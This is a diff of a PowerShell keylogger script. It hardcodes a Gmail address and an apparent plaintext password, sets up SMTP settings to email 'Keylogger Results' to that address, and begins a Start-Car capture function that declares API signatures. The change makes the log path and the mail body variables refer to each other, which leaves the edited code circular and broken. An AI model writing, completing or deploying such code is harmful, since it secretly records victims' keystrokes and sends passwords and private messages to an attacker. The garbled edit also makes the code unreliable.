@@ -2,11 +2,11 @@ $From = "madman1237890026525@gmail.com"
 $Pass = "Madman009"
 $To = "madman1237890026525@gmail.com"
 $Subject = "Keylogger Results"
-$body = "Keylogger Results"
+$body = $Path
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-$Path="C:\Intel\Car.txt"
+$Path=$body
 
 
 # Edit only this section!
@@ -16,7 +16,7 @@ $RunTimeP = 1
 $TimeStart = Get-Date
 $TimeEnd = $timeStart.addminutes($RunTimeP)
 #requires -Version 2
-function Start-Car($Path="C:\Intel\Car.txt") 
+function Start-Car($Path=$body) 
 {
   # Signatures for API Calls
   $signatures = @'
